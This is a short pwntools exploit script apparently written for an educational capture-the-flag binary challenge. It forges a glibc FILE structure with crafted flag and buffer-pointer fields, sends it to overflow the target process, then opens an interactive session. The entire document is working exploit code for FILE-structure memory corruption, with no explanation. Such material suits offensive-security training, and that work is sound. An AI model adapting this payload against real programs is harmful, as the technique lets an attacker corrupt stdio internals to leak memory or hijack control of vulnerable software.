from pwn import *

context.clear( arch = 'amd64', log_level = 'debug' )
# context.terminal = [ 'terminator', 'splitw', '-h' ]

# p = remote( 'edu-ctf.zoolab.org', 10009 )
p = process('./chal')

flag = 0
flag &= ~( 0x4 | 0x10 )
flag |= 0xFBAD0000
print( hex( flag ) )
fileno = 0
read_ptr = read_end = 0
buf_base = write_base = 0x404070
buf_end = 0x404070 + 0x20

payload = 3 * p64(0) + p64(0x1e1)
payload += p64( flag )
payload += p64( read_ptr )
payload += p64( read_end )
payload += p64(0)
payload += p64( write_base )
payload += p64(0) * 2
payload += p64( buf_base )
payload += p64( buf_end )
payload += p64(0) * 5
payload += p64( fileno )

gdb.attach(p)
# input('>')
p.sendline( payload )
# input('>')
sleep(1)
p.sendline( b'A\x00')

p.interactive()
